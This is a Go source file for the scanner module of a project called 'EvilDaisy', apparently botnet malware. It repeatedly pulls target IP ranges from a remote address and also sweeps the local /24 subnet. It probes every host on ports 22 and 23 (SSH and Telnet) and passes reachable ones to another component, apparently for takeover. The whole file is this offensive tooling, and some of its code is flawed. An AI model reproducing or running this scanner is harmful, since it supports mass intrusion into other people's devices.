package Scanner

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"io/ioutil"
	"net/http"
	"os/exec"

	"golang.org/x/sync/semaphore"

	"EvilDaisy/Configs"
	"EvilDaisy/Utils"
)

// PortScanner ...
type PortScanner struct {
	ip   string
	lock *semaphore.Weighted
}

// PortList ...
var PortList = []int{22, 23}

// Hosts ...
func Hosts(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}
	// remove network address and broadcast address
	return ips[1 : len(ips)-1], nil
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// StartTheRemoteScan ...
func StartTheRemoteScan() {
	for {
		if req, err := http.Get("URL"); err == nil {
			defer req.Body.Close()
			if bodyBytes, err := ioutil.ReadAll(req.Body); err == nil {
				if ipArray, err := Hosts(string(bodyBytes)); err == nil {
					for _, d := range ipArray {
						go func(target string) {
							ps := &PortScanner{
								ip:   target,
								lock: semaphore.NewWeighted(uLimit()),
							}
							ps.Start(time.Millisecond * 500)
						}(d)
					}
				} else {
					if Configs.IsDebug {
						fmt.Println(err.Error())
					}
				}
			} else {
				if Configs.IsDebug {
					fmt.Println(err.Error())
				}
			}
		} else {
			if Configs.IsDebug {
				fmt.Println(err.Error())
			}
		}
	}
}

// GetOutboundIP ...
func GetOutboundIP() string {
	if conn, err := net.Dial("udp", "8.8.8.8:80"); err == nil {
		defer conn.Close()
		return conn.LocalAddr().String()
	}

	return "0.0.0.0"
}

// StartLocalScan ...
func StartLocalScan() {
	tmpStr := strings.Split(GetOutboundIP(), ":")
	addrArray := strings.Split(tmpStr[0], ".")
	if ipArray, err := Hosts(string(addrArray[0] + "." + addrArray[1] + "." + addrArray[2] + "." + "0/24")); err == nil {
		for _, d := range ipArray {
			go func(ip string) {
				ps := &PortScanner{
					ip:   ip,
					lock: semaphore.NewWeighted(1024), //uLimit()
				}
				ps.Start(time.Millisecond * 500)
			}(d)
		}
	} else {
		if Configs.IsDebug {
			fmt.Println(err.Error())
		}
	}

}

func uLimit() int64 {
	if out, err := exec.Command("sh", "ulimit", "-n").Output(); err == nil {
		s := strings.TrimSpace(string(out))
		if Configs.IsDebug {
			fmt.Println(s)
		}
		if i, err := strconv.ParseInt(s, 10, 64); err == nil {
			return i
		}
		return 0
	} else {
		if Configs.IsDebug {
			fmt.Println(err.Error())
		}
	}

	return 0
}

// ScanPort ...
func ScanPort(ip string, port int, timeout time.Duration) {
	target := fmt.Sprintf("%s:%d", ip, port)
	if conn, err := net.DialTimeout("tcp", target, timeout); err != nil {
		if strings.Contains(err.Error(), "too many open files") {
			time.Sleep(timeout)
			ScanPort(ip, port, timeout)
		} else {
			if Configs.IsDebug {
				fmt.Println(err.Error())
			}
		}
		return
	} else {
		if Configs.IsDebug {
			fmt.Println(target)
		}
		Utils.AccessIPList <- target
		conn.Close()
	}
}

// Start ...
func (ps *PortScanner) Start(timeout time.Duration) {
	wg := sync.WaitGroup{}
	defer wg.Wait()
	for i := 0; i != len(PortList); i++ {
		ps.lock.Acquire(context.TODO(), 1)
		wg.Add(1)
		go func(port int) {
			defer ps.lock.Release(1)
			defer wg.Done()
			ScanPort(ps.ip, port, timeout)
		}(PortList[i])

	}
}
